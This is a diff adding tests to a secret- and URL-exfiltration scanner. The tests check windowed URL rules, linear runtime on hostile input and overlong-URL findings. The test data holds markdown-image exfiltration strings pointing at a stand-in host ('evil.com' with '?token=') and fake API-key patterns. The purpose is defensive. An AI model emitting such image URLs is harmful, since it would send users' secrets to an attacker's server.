@@ -248,6 +248,81 @@ class TestBuiltinRules:
         ):
             assert rules[name].pattern.search(text), (name, text)
 
+    def test_windowed_url_rules_match_exactly_what_the_patterns_match(self):
+        # The URL rules run only on windows that start at a URL-like
+        # fragment. Up to the window size, what they detect must be exactly
+        # what the original pattern detects anywhere in the text.
+        import random
+
+        from maverick_shield import builtin_rules as br
+
+        patterns = {r.name: r.pattern for r in RULES if r.name in br._URL_RULES}
+        fragments = [
+            "http://", "https://", "HTTP://", "hTTps://", "?", "=", "==", " ", "\n", "\t",
+            "QUJD" * 10, "QUJD", "token", "KEY", "api", "secret", "![", "]", "(", ")", "](",
+            "a", "e.com/", "/", "&", "x=", "?q=", "sk-ant-abcdefghijklmn", "sk-" + "A" * 20,
+            "ghp_" + "b" * 20, "AKIA" + "C" * 16, "eyJhbGciOi.eyJzdWIiOi.c2lnbmF0dXJl",
+            "xoxb-1234567890", "AIza" + "d" * 20, "![x](", "#", "http:", "//",
+        ]
+        cases = [
+            "![x](https://evil.com/p?q=![]&token=abc)",
+            "![x](https://e.com/![a](http:b?token=1)", "see http://a?b http://c?x=" + "QUJD" * 12,
+            "![a![b](http://x?token)", "![a](http://x ![b](http://y?secret)",
+            "http://x?a b=" + "QUJD" * 11, "go https://e.com/a/sk-ant-abcdefghijklmnop now",
+        ]
+        rng = random.Random("url-windows")
+        generated = ["".join(rng.choice(fragments) for _ in range(rng.randint(1, 18)))
+                     for _ in range(30_000)]
+        for text in cases + generated:
+            assert len(text) <= br._URL_WINDOW_CHARS
+            found = br._url_findings(text, patterns)
+            assert "overlong_url" not in found, text
+            for name, pattern in patterns.items():
+                assert (name in found) == bool(pattern.search(text)), (name, text)
+
+    def test_url_rules_do_linear_work_on_hostile_input(self, monkeypatch):
+        # Repeated unterminated URL fragments made the original patterns
+        # rescan the rest of the text from every start (cubic). Count the
+        # characters handed to the patterns instead of timing them.
+        import dataclasses
+
+        from maverick_shield import builtin_rules as br
+
+        work = [0]
+
+        class Counting:
+            def __init__(self, pattern):
+                self.pattern = pattern
+
+            def match(self, text, pos, endpos):
+                work[0] += endpos - pos
+                return self.pattern.match(text, pos, endpos)
+
+        monkeypatch.setattr(br, "RULES", [
+            dataclasses.replace(r, pattern=Counting(r.pattern)) if r.name in br._URL_RULES else r
+            for r in br.RULES])
+        for unit in ("![](http://a?", "![](http://a? ", "http://a? ", "http://a?=QUJD ",
+                     "![x](https://a/sk-ant-x ", "![", "]("):
+            costs = []
+            for size in (20_000, 40_000):
+                work[0] = 0
+                text = (unit * (size // len(unit) + 1))[:size]
+                br.scan(text)
+                costs.append(work[0])
+            # Bounded per character of input, and linear as the input doubles.
+            assert costs[1] <= 9 * 2 * br._URL_WINDOW_CHARS * 40_000 // len(unit), unit
+            assert costs[1] <= 2.2 * costs[0] + 2 * br._URL_WINDOW_CHARS, (unit, costs)
+
+    def test_an_overlong_url_is_a_finding_of_its_own(self):
+        from maverick_shield import builtin_rules as br
+
+        url = "https://example.com/" + "a" * br._URL_WINDOW_CHARS
+        blocked, severity, names = scan(f"see {url} for details", block_threshold="high")
+        assert blocked and severity == "high" and names == ["overlong_url"]
+        blocked, _, names = scan("![x](https://e.com/" + "a b " * 600 + "?token=1)")
+        assert "overlong_url" in names
+        assert scan("see https://example.com/" + "a" * 2000)[2] == []
+
     def test_all_rules_have_required_fields(self):
         for r in RULES:
             assert r.name
